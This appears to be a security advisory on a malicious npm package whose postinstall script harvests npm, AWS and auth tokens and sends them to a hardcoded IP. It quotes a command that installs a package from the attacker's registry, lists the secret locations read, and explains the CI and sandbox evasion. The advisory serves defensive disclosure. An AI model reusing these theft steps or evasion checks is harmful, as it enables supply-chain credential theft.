summary: coral-wraith postinstall exfiltrates npm auth tokens to hardcoded C2
details: On `npm install`, postinstall.js executes a credential-harvest routine: it enumerates `.npmrc` files across the filesystem, dumps `npm config` output (registry/auth/token fields), reads `/proc/1/environ` for AWS/auth/token environment variables, and greps `/root`, `/app`, and `/usr/etc` for `_authToken=` and `npm_*` token patterns. The collected data is base64-encoded and HTTP PUT to a hardcoded bare-IP C2 at `http://154.57.164.64:32271` under sink IDs `ECT-839201` and `ECT-472839`. The same script also runs `npm install phantom-powder-keg --registry http://154.57.164.64:32271/` and contacts `registry.spectral-corsair.htb:1337` via Host-header spoofing, staging remote code retrieval from an attacker-controlled registry. Execution is gated to evade analysis: it skips when the registry matches mirrors (npmmirror/tencent/cnpm/taobao) or CI environments (GITHUB_ACTIONS/RUNNER_OS/CI) are detected, and only fires when the hostname matches the Docker-container 12-hex-character default and the cwd contains `/app`. The combination of installer-credential theft, attacker-controlled registry retrieval, and anti-sandbox gating is unambiguous supply-chain attack behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
